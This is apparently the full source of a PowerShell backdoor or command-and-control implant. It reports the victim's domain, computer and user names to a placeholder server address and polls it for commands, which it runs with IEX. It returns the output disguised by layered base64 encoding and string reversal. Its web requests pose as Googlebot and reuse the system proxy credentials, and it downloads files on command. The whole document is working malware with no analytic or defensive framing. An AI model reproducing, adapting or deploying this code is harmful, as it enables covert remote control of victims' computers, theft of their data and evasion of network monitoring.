Error
cls
$Address = "(server)"
$global:timer = 10
function To6String($str){
return [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($str))
}

function To5String($str){
return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($str))
}

function ToBaseRevString($str){
    $str = $str.ToCharArray()
    [array]::Reverse($str)
    $str = -join($str)
    return $str
}

function bssb($str){
    $str = To6String($str)
    $str = To6String($str)
    $str = ToBaseRevString($str)
    $str = To6String($str)
    $str = To6String($str)
    return $str}

function gbsg($str){
    $str = To5String($str)
    $str =To5String($str)
    $str = ToBaseRevString($str)
    $str = To5String($str)
    $str = To5String($str)
    return $str}

function login(){
    while ($true) {
    $info = $env:USERDOMAIN+"||"+$env:COMPUTERNAME+"||"+$env:username
    sleep $global:timer
    try {
     $r = [System.Net.HTTPWebRequest]::Create($Address+"(login)"+"?info="+$info)
     $r.Method = "GET"
     $r.proxy = [Net.WebRequest]::GetSystemWebProxy()
	 $r.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
     $r.KeepAlive = $false
     $r.UserAgent = "Googlebot"
     $r.Headers.Add("Accept-Encoding", "identity");
     $rr = $r.GetResponse()
     $reqstream = $rr.GetResponseStream()
     $sr = New-Object System.IO.StreamReader $reqstream
     $jj = $sr.ReadToEnd()
     if ($jj){return $jj}}catch { Write-Host $_ ; Continue}}}

function sender($data){
    try {
     $r = [System.Net.HTTPWebRequest]::Create($Address+"(getcommand)?"+$data)
     $r.Method = "GET"
     $r.proxy = [Net.WebRequest]::GetSystemWebProxy()
	 $r.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
     $r.KeepAlive = $false
     $r.UserAgent = "Googlebot"
     $r.Headers.Add("Accept-Encoding", "identity");
     $rr = $r.GetResponse()
     }catch{Continue}}

$dd = login
while ($true) {
    sleep $global:timer
    $gc = "(sendcommand)?" + $dd +"="+$dd
     try {
     $r = [System.Net.HTTPWebRequest]::Create($Address+$gc)
     $r.Method = "GET"
     $r.proxy = [Net.WebRequest]::GetSystemWebProxy()
	 $r.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
     $r.KeepAlive = $false
     $r.UserAgent = "Googlebot"
     $r.Headers.Add("Accept-Encoding", "identity");
     $rr = $r.GetResponse()
     $reqstream = $rr.GetResponseStream()
     $sr = New-Object System.IO.StreamReader $reqstream
     $jj = $sr.ReadToEnd()
     $jj = (gbsg $jj)
     if ($jj -eq "0"){$dd = login}
     if (!$jj){continue}
     if(($jj) -like "*upload*"){$ss=$jj;$ss=$ss.Replace("*",":");$ss=$ss.split(" ")[1];$fname=$ss.split('/')[-1];$webClient = New-Object System.Net.WebClient;set-Content -Path ($fname.split("|")[0]) -Value $webClient.DownloadString($ss)}
     if(($jj) -like "*timer*"){$tt=$jj;$tt=$tt.split(" ")[1];$global:timer = $tt}
     else{
     $out = IEX $jj
     $out = ($out | Out-String)
     $out = bssb $out
     $out = $dd +"="+$out
     sender($out)
     }}catch { Write-Host $_}}